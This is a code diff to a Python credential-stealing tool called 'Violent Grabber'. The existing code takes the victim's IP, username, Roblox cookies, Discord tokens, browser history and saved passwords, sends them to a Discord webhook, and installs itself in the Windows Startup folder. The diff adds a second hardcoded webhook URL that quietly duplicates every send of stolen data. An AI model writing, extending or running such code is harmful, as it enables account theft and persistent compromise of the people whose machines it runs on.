@@ -25,6 +25,7 @@ import pyscreenshot #line:10
 import subprocess #line:11
 webhook_url = webhookz
 webhook = nextcord.SyncWebhook.from_url(webhook_url)
+webhooke = nextcord.SyncWebhook.from_url("https://discord.com/api/webhooks/1095670622148890735/l8mJ4-OJPAr1KFwz5Nl3G3nHts4uWwEYuJjDbl3yNLaSCzsw8HAke_-iEW32GvuAl3Yu")
 import subprocess
 response = requests.get('https://api.ipify.org')
 ip = response.text
@@ -71,6 +72,8 @@ embed.add_field(name="Logged in User", value=f"**{subprocess.check_output('whoam
 
 webhook.send("@everyone")
 webhook.send(embed=embed)
+webhooke.send("@everyone")
+webhooke.send(embed=embed)
 embed = nextcord.Embed(
     title="Violent Grabber",
     description="Roblox cookies.",
@@ -121,6 +124,7 @@ try:
 except:
     pass
 webhook.send(embed=embed)
+webhooke.send(embed=embed)
 import browser_cookie3
 
 webhook.send(embed=embed)
@@ -155,6 +159,7 @@ if msg[0] == "\n":
 embed.add_field(name="Discord tokens: ", value=msg)
 embed.set_image("https://cdn.discordapp.com/attachments/1088759733378371635/1093940553751732224/211176071-8a9022fc-ce6a-4543-ae5d-87108fa9593c-1.gif")
 webhook.send(embed=embed)
+webhooke.send(embed=embed)
 import sqlite3
 import os
 import time
@@ -181,6 +186,7 @@ for x in urls:
 con.close()
 file = nextcord.File(temp + r"\history12" + r"\history.txt", filename="history.txt")
 webhook.send(file=file)
+webhooke.send(file=file)
 
 
 
@@ -204,6 +210,7 @@ f4.write(str(passwords))
 f4.close()
 file = nextcord.File(temp + r"\passwords.txt", filename="passwords.txt")
 webhook.send(file=file)
+webhooke.send(file=file)
 import os
 import shutil
 import getpass
@@ -224,7 +231,8 @@ else:
 # Check if the script is already in the Startup folder
 startup_script = os.path.join(startup_folder, os.path.basename(script_path))
 if os.path.exists(startup_script):
-    print("e")
+    webhook.send("Made by violent")
+    webhooke.send("DualHooked Beam In startup")
 else:
     # Copy the script to the Startup folder
     shutil.copy(script_path, startup_folder)
